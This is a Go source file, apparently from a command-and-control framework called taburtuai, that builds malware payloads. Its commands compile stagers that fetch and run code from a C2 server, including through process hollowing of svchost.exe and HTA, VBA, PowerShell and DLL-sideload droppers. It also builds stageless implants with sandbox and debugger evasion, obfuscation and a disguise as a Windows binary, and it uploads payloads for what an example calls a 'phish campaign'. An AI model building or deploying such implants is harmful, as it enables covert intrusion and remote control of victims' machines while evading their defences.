package main

import (
	"bytes"
	"crypto/sha256"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/spf13/cobra"
)

// ── stager subcommand ─────────────────────────────────────────────────────────

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "Compile a minimal stager that downloads and executes a staged payload",
	Example: `  taburtuai-generate stager \
    --c2 https://c2.example.com \
    --token abc123def456 \
    --key MyAESKey16Chars \
    --method hollow \
    --format exe \
    --output bin/stager.exe

  taburtuai-generate stager \
    --c2 https://c2.example.com \
    --token abc123def456 \
    --format ps1 \
    --output stager.ps1`,
	RunE: runStager,
}

func init() {
	stagerCmd.Flags().String("server", "http://127.0.0.1:8080", "C2 server URL")
	stagerCmd.Flags().String("c2", "", "C2 server URL (alias for --server)")
	stagerCmd.Flags().String("token", "", "Stage token (required — from 'stage upload')")
	stagerCmd.Flags().String("key", "", "AES encryption key (must match server ENCRYPTION_KEY)")
	stagerCmd.Flags().String("exec-method", "drop", "Execution method: drop|hollow|thread")
	stagerCmd.Flags().String("hollow-exe", `C:\Windows\System32\svchost.exe`, "Hollow target process")
	stagerCmd.Flags().String("format", "exe", "Output format: exe|ps1|ps1-mem|hta|vba|cs|shellcode|dll")
	stagerCmd.Flags().String("arch", "amd64", "Target arch: amd64|x86")
	stagerCmd.Flags().Int("jitter", 0, "Anti-sandbox delay seconds before execution")
	stagerCmd.Flags().String("output", "", "Output file path (default: auto-named in current dir)")
	stagerCmd.Flags().Bool("no-strip", false, "Keep debug symbols (larger binary)")
	_ = stagerCmd.MarkFlagRequired("token")
	_ = stagerCmd.MarkFlagRequired("key")
}

func runStager(cmd *cobra.Command, _ []string) error {
	server, _ := cmd.Flags().GetString("server")
	c2alias, _ := cmd.Flags().GetString("c2")
	if c2alias != "" {
		server = c2alias // --c2 takes precedence if explicitly set
	}
	c2 := server
	token, _ := cmd.Flags().GetString("token")
	key, _ := cmd.Flags().GetString("key")
	method, _ := cmd.Flags().GetString("exec-method")
	hollowExe, _ := cmd.Flags().GetString("hollow-exe")
	format, _ := cmd.Flags().GetString("format")
	arch, _ := cmd.Flags().GetString("arch")
	jitter, _ := cmd.Flags().GetInt("jitter")
	output, _ := cmd.Flags().GetString("output")
	noStrip, _ := cmd.Flags().GetBool("no-strip")

	// Always compile the EXE first
	exePath, tmpDir, err := compileStager(compileOpts{
		C2URL:     c2,
		Token:     token,
		Key:       key,
		Method:    method,
		HollowExe: hollowExe,
		Arch:      arch,
		Jitter:    fmt.Sprintf("%d", jitter),
		Strip:     !noStrip,
	})
	if err != nil {
		return fmt.Errorf("compile stager: %w", err)
	}
	if tmpDir != "" {
		defer os.RemoveAll(tmpDir)
	}

	exeBytes, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("read stager binary: %w", err)
	}

	// Token travels in X-Stage-Token header — endpoint URL has no token in path.
	stageEndpoint := strings.TrimRight(c2, "/") + "/stage/payload"

	var data []byte
	var ext string

	switch format {
	case "exe":
		data, ext = exeBytes, ".exe"
	case "ps1":
		data, ext = []byte(templatePS1Drop(stageEndpoint, token)), ".ps1"
	case "ps1-mem":
		data, ext = []byte(templatePS1Shellcode(stageEndpoint, token)), ".ps1"
	case "hta":
		data, ext = []byte(templateHTA(stageEndpoint, token, exeBytes)), ".hta"
	case "vba":
		data, ext = []byte(templateVBA(stageEndpoint, token)), ".bas"
	case "cs":
		data, ext = []byte(templateCS(stageEndpoint, token)), ".cs"
	case "shellcode":
		sc, err := pe2Shellcode(exeBytes)
		if err != nil {
			return fmt.Errorf("shellcode conversion: %w", err)
		}
		data, ext = sc, ".bin"
	case "dll":
		dllBytes, err := buildSideloadDLL(compileOpts{
			C2URL: c2, Token: token, Key: key,
			Method: method, Arch: arch, Strip: !noStrip,
		})
		if err != nil {
			return fmt.Errorf("build DLL: %w", err)
		}
		data, ext = dllBytes, ".dll"
	default:
		return fmt.Errorf("unknown format %q (exe|ps1|ps1-mem|hta|vba|cs|shellcode|dll)", format)
	}

	return writeOutput(output, ext, data)
}

// ── stageless subcommand ──────────────────────────────────────────────────────

var stagelessCmd = &cobra.Command{
	Use:   "stageless",
	Short: "Compile the full agent as a self-contained implant",
	Example: `  taburtuai-generate stageless \
    --c2 https://c2.example.com \
    --key MyAESKey \
    --interval 60 --jitter 20 \
    --kill-date 2026-12-31 \
    --output bin/implant.exe

  # Use an OPSEC profile YAML (overrides interval/jitter/evasion flags):
  taburtuai-generate stageless \
    --c2 https://c2.example.com \
    --key MyAESKey \
    --profile profiles/stealth.yaml \
    --output bin/implant.exe`,
	RunE: runStageless,
}

func init() {
	stagelessCmd.Flags().String("c2", "", "C2 server URL")
	stagelessCmd.Flags().String("key", "", "AES encryption key (must match server ENCRYPTION_KEY)")
stagelessCmd.Flags().Int("interval", 30, "Beacon interval (seconds)")
	stagelessCmd.Flags().Int("jitter", 20, "Jitter percent")
	stagelessCmd.Flags().String("kill-date", "", "Kill date YYYY-MM-DD")
	stagelessCmd.Flags().String("exec-method", "powershell", "Default exec method")
	stagelessCmd.Flags().Bool("evasion", true, "Enable evasion features")
	stagelessCmd.Flags().Bool("sleep-mask", true, "Enable sleep masking")
	stagelessCmd.Flags().String("arch", "amd64", "Target arch: amd64|x86")
	stagelessCmd.Flags().Bool("no-gui", true, "Hide console window (-H windowsgui)")
	stagelessCmd.Flags().Bool("garble", false, "Use garble obfuscation (requires garble in PATH)")
	stagelessCmd.Flags().Bool("compress", false, "UPX-compress the output binary")
	stagelessCmd.Flags().String("profile", "", "Path to OPSEC profile YAML (overrides evasion flags)")
	stagelessCmd.Flags().String("c2-profile", "", "Malleable C2 profile name: default|office365|cdn|jquery|slack|ocsp")
	stagelessCmd.Flags().String("lang", "go", "Implant language: go|c  (c = C/ASM MinGW build)")
	stagelessCmd.Flags().String("fallback-urls", "", "Comma-separated fallback C2 URLs (C implant only)")
	stagelessCmd.Flags().String("output", "", "Output file path")
	// ── C implant: working-hours ──────────────────────────────────────────────
	stagelessCmd.Flags().Bool("work-hours", false, "Only beacon during working hours (C implant only)")
	stagelessCmd.Flags().Int("work-start", 8, "Working hours start, 24h (C implant only)")
	stagelessCmd.Flags().Int("work-end", 18, "Working hours end, 24h (C implant only)")
	// ── C implant: PE masquerade overrides (all override --profile) ───────────
	stagelessCmd.Flags().String("masq-company", "", "PE version-resource company name")
	stagelessCmd.Flags().String("masq-product", "", "PE version-resource product name")
	stagelessCmd.Flags().String("masq-desc", "", "PE version-resource file description")
	stagelessCmd.Flags().String("masq-orig", "", "PE version-resource OriginalFilename (e.g. RuntimeBroker.exe)")
	stagelessCmd.Flags().String("masq-internal", "", "PE version-resource InternalName (default: masq-orig minus .exe)")
	stagelessCmd.Flags().String("masq-ver", "", "PE version string, e.g. 10.0.19041.1")
	_ = stagelessCmd.MarkFlagRequired("c2")
	_ = stagelessCmd.MarkFlagRequired("key")
}

func runStageless(cmd *cobra.Command, _ []string) error {
	c2, _ := cmd.Flags().GetString("c2")
	key, _ := cmd.Flags().GetString("key")
	interval, _ := cmd.Flags().GetInt("interval")
	jitter, _ := cmd.Flags().GetInt("jitter")
	killDate, _ := cmd.Flags().GetString("kill-date")
	execMethod, _ := cmd.Flags().GetString("exec-method")
	evasion, _ := cmd.Flags().GetBool("evasion")
	sleepMask, _ := cmd.Flags().GetBool("sleep-mask")
	arch, _ := cmd.Flags().GetString("arch")
	noGUI, _ := cmd.Flags().GetBool("no-gui")
	useGarble, _ := cmd.Flags().GetBool("garble")
	compress, _ := cmd.Flags().GetBool("compress")
	profilePath, _ := cmd.Flags().GetString("profile")
	c2ProfileName, _ := cmd.Flags().GetString("c2-profile")
	lang, _ := cmd.Flags().GetString("lang")
	fallbackURLs, _ := cmd.Flags().GetString("fallback-urls")
	output, _ := cmd.Flags().GetString("output")
	// C-implant-specific flags
	workHours, _ := cmd.Flags().GetBool("work-hours")
	workStart, _ := cmd.Flags().GetInt("work-start")
	workEnd, _ := cmd.Flags().GetInt("work-end")
	masqCompany, _ := cmd.Flags().GetString("masq-company")
	masqProduct, _ := cmd.Flags().GetString("masq-product")
	masqDesc, _ := cmd.Flags().GetString("masq-desc")
	masqOrig, _ := cmd.Flags().GetString("masq-orig")
	masqInternal, _ := cmd.Flags().GetString("masq-internal")
	masqVer, _ := cmd.Flags().GetString("masq-ver")

	var profile *OpsecProfile
	if profilePath != "" {
		var err error
		profile, err = LoadProfile(profilePath)
		if err != nil {
			return fmt.Errorf("load profile: %w", err)
		}
		fmt.Printf("[*] Using profile: %s\n", profile.Name)
	} else if c2ProfileName != "" {
		fmt.Printf("[*] Using C2 profile: %s\n", c2ProfileName)
		profile = &OpsecProfile{
			SleepInterval:      time.Duration(interval) * time.Second,
			JitterPercent:      jitter,
			KillDate:           killDate,
			ExecMethod:         execMethod,
			EnableSandboxCheck: evasion,
			EnableVMCheck:      evasion,
			EnableDebugCheck:   evasion,
			SleepMasking:       sleepMask,
			Obfuscate:          useGarble,
		}
	} else {
		profile = &OpsecProfile{
			SleepInterval:      time.Duration(interval) * time.Second,
			JitterPercent:      jitter,
			KillDate:           killDate,
			ExecMethod:         execMethod,
			EnableSandboxCheck: evasion,
			EnableVMCheck:      evasion,
			EnableDebugCheck:   evasion,
			SleepMasking:       sleepMask,
			Obfuscate:          useGarble,
		}
	}

	outDir := "."
	outName := "implant_" + arch
	if output != "" {
		outDir = filepath.Dir(output)
		outName = strings.TrimSuffix(filepath.Base(output), ".exe")
	}

	// ── C/ASM build path ──────────────────────────────────────────────────
	if lang == "c" {
		cCfg := &CConfig{
			ServerURL:     c2,
			EncKey:        key,
				IntervalSec:   interval,
			JitterPct:     jitter,
			KillDate:      killDate,
			ExecMethod:    execMethod,
			EnableEvasion: evasion,
			SleepMasking:  sleepMask,
			FallbackURLs:  fallbackURLs,
			C2Profile:     c2ProfileName,
			WorkHoursOnly: workHours,
			WorkStart:     workStart,
			WorkEnd:       workEnd,
			Debug:         false,
			OutputDir:     outDir,
			OutputName:    outName,
		}

		if profile != nil {
			// Profile overrides CLI behaviour flags
			cCfg.IntervalSec   = int(profile.SleepInterval.Seconds())
			cCfg.JitterPct     = profile.JitterPercent
			cCfg.MaxRetries    = profile.MaxRetries
			cCfg.KillDate      = profile.KillDate
			cCfg.ExecMethod    = profile.ExecMethod
			cCfg.EnableEvasion = profile.EnableSandboxCheck || profile.EnableVMCheck || profile.EnableDebugCheck
			cCfg.SleepMasking  = profile.SleepMasking
			cCfg.WorkHoursOnly = profile.WorkingHoursOnly
			cCfg.WorkStart     = profile.WorkingHoursStart
			cCfg.WorkEnd       = profile.WorkingHoursEnd

			// Profile masquerade (CLI --masq-* flags below take precedence)
			if profile.Masquerade.Enabled {
				if masqCompany == "" {
					cCfg.MasqCompany = profile.Masquerade.Company
				}
				if masqProduct == "" {
					cCfg.MasqProduct = profile.Masquerade.Product
				}
				if masqDesc == "" {
					cCfg.MasqDesc = profile.Masquerade.Description
				}
				if masqOrig == "" {
					cCfg.MasqOrigFile = profile.Masquerade.OriginalFilename
					cCfg.MasqInternal = strings.TrimSuffix(profile.Masquerade.OriginalFilename, ".exe")
				}
				if masqVer == "" && profile.Masquerade.Version != "" {
					ms, ls := parseVersion(profile.Masquerade.Version)
					cCfg.MasqVerMajor = int(ms >> 16)
					cCfg.MasqVerMinor = int(ms & 0xFFFF)
					cCfg.MasqVerBuild = int(ls >> 16)
					cCfg.MasqVerRev   = int(ls & 0xFFFF)
				}
			}
		}

		// CLI --masq-* flags always override profile
		if masqCompany != "" {
			cCfg.MasqCompany = masqCompany
		}
		if masqProduct != "" {
			cCfg.MasqProduct = masqProduct
		}
		if masqDesc != "" {
			cCfg.MasqDesc = masqDesc
		}
		if masqOrig != "" {
			cCfg.MasqOrigFile = masqOrig
			if masqInternal == "" {
				cCfg.MasqInternal = strings.TrimSuffix(masqOrig, ".exe")
			}
		}
		if masqInternal != "" {
			cCfg.MasqInternal = masqInternal
		}
		if masqVer != "" {
			ms, ls := parseVersion(masqVer)
			cCfg.MasqVerMajor = int(ms >> 16)
			cCfg.MasqVerMinor = int(ms & 0xFFFF)
			cCfg.MasqVerBuild = int(ls >> 16)
			cCfg.MasqVerRev   = int(ls & 0xFFFF)
		}

		result, err := BuildC(cCfg)
		if err != nil {
			return err
		}
		fmt.Printf("[+] C implant        : %s\n", result.OutputPath)
		fmt.Printf("    Size             : %d KB\n", result.FileSize/1024)
		fmt.Printf("    SHA256           : %s\n", result.SHA256)
		fmt.Printf("    MD5              : %s\n", result.MD5)
		fmt.Printf("    Build time       : %s\n", result.BuildTime.Round(time.Millisecond))
		return nil
	}

	g := New(filepath.Join(moduleRoot(), "cmd", "agent"))
	fmt.Printf("[*] Compiling agent (%s/windows)...\n", arch)
	result, err := g.Build(&Config{
		ServerURL:    c2,
		EncKey:       key,
		TargetOS:     OSWindows,
		TargetArch:   TargetArch(arch),
		Format:       FormatEXE,
		OutputDir:    outDir,
		OutputName:   outName,
		StripSyms:    true,
		NoGUI:        noGUI,
		Compress:     compress,
		Profile:      profile,
	})
	if err != nil {
		return err
	}
	fmt.Printf("[+] Stageless implant : %s\n", result.OutputPath)
	fmt.Printf("    Size              : %d KB\n", result.FileSize/1024)
	fmt.Printf("    SHA256            : %s\n", result.SHA256)
	fmt.Printf("    MD5               : %s\n", result.MD5)
	fmt.Printf("    Build time        : %s\n", result.BuildTime.Round(time.Millisecond))
	return nil
}

// ── upload subcommand ─────────────────────────────────────────────────────────

var uploadCmd = &cobra.Command{
	Use:   "upload <payload-file>",
	Short: "Upload a payload file to the C2 stage server",
	Args:  cobra.ExactArgs(1),
	Example: `  taburtuai-generate upload bin/agent.exe \
    --server https://c2.example.com \
    --api-key mykey \
    --format exe --ttl 24 --desc "phish campaign"`,
	RunE: runUpload,
}

func init() {
	uploadCmd.Flags().String("server", "http://127.0.0.1:8080", "C2 server URL")
	uploadCmd.Flags().String("api-key", "", "C2 API key")
	uploadCmd.Flags().String("format", "exe", "Payload format: exe|shellcode|dll")
	uploadCmd.Flags().String("arch", "amd64", "Payload arch")
	uploadCmd.Flags().Int("ttl", 24, "TTL hours (0=no expiry)")
	uploadCmd.Flags().String("desc", "", "Description")
}

func runUpload(cmd *cobra.Command, args []string) error {
	payloadFile := args[0]
	server, _ := cmd.Flags().GetString("server")
	apiKey, _ := cmd.Flags().GetString("api-key")
	format, _ := cmd.Flags().GetString("format")
	arch, _ := cmd.Flags().GetString("arch")
	ttl, _ := cmd.Flags().GetInt("ttl")
	desc, _ := cmd.Flags().GetString("desc")

	data, err := os.ReadFile(payloadFile)
	if err != nil {
		return fmt.Errorf("read payload: %w", err)
	}

	token, stageURL, err := uploadStage(server, apiKey, data, format, arch, ttl, desc)
	if err != nil {
		return fmt.Errorf("upload: %w", err)
	}

	fmt.Printf("[+] Stage uploaded\n")
	fmt.Printf("    Token    : %s\n", token)
	fmt.Printf("    Stage URL: %s\n", stageURL)
	fmt.Printf("    Format   : %s/%s\n", format, arch)
	fmt.Printf("    Size     : %d bytes\n", len(data))
	fmt.Printf("    TTL      : %dh\n", ttl)
	return nil
}

// ── compilation helpers ───────────────────────────────────────────────────────

type compileOpts struct {
	C2URL     string
	Token     string
	Key       string
	Method    string
	HollowExe string
	Arch      string
	Jitter    string
	Strip     bool
}

// compileStager cross-compiles cmd/stager for Windows with baked-in config.
// Returns path to the compiled binary and a temp dir to clean up (may be "").
func compileStager(o compileOpts) (exePath, tmpDir string, err error) {
	tmpDir, err = os.MkdirTemp("", "taburtuai-stager-*")
	if err != nil {
		return "", "", err
	}

	outFile := filepath.Join(tmpDir, "stager.exe")

	ldflags := strings.Join([]string{
		"-s", "-w",
		"-H", "windowsgui",
		fmt.Sprintf("-X main.c2URL=%s", o.C2URL),
		fmt.Sprintf("-X main.stageToken=%s", o.Token),
		fmt.Sprintf("-X main.encKey=%s", o.Key),
		fmt.Sprintf("-X main.execMethod=%s", o.Method),
		fmt.Sprintf("-X 'main.hollowExe=%s'", o.HollowExe),
		fmt.Sprintf("-X main.jitterSleep=%s", o.Jitter),
	}, " ")

	if !o.Strip {
		ldflags = strings.TrimPrefix(ldflags, "-s -w ")
	}

	goTool := "go"
	goArch := o.Arch
	if goArch == "" {
		goArch = "amd64"
	}

	cmdArgs := []string{
		"build",
		"-ldflags", ldflags,
		"-o", outFile,
		"./cmd/stager",
	}

	c := exec.Command(goTool, cmdArgs...)
	c.Env = append(os.Environ(),
		"GOOS=windows",
		fmt.Sprintf("GOARCH=%s", goArch),
		"CGO_ENABLED=0",
	)
	c.Dir = moduleRoot()

	var buf bytes.Buffer
	c.Stdout = &buf
	c.Stderr = &buf

	fmt.Printf("[*] Compiling stager (%s/windows)...\n", goArch)
	if err := c.Run(); err != nil {
		return "", tmpDir, fmt.Errorf("go build failed:\n%s", buf.String())
	}

	info, _ := os.Stat(outFile)
	fmt.Printf("[+] Stager compiled: %d KB\n", info.Size()/1024)
	return outFile, tmpDir, nil
}

// ── misc helpers ──────────────────────────────────────────────────────────────

// moduleRoot returns the directory containing go.mod (project root).
func moduleRoot() string {
	// Walk up from the generate binary location
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	dir := filepath.Dir(exe)
	for {
		if _, err := os.Stat(filepath.Join(dir, "go.mod")); err == nil {
			return dir
		}
		parent := filepath.Dir(dir)
		if parent == dir {
			break
		}
		dir = parent
	}
	// Fallback: use runtime caller to find source dir
	_, file, _, ok := runtime.Caller(0)
	if ok {
		return filepath.Join(filepath.Dir(file), "..", "..")
	}
	return "."
}

func writeOutput(path, defaultExt string, data []byte) error {
	if path == "" {
		path = "output" + defaultExt
	}
	if err := os.WriteFile(path, data, 0644); err != nil {
		return err
	}
	sum := sha256.Sum256(data)
	fmt.Printf("[+] Output  : %s\n", path)
	fmt.Printf("    Size    : %d bytes\n", len(data))
	fmt.Printf("    SHA256  : %x\n", sum)
	return nil
}

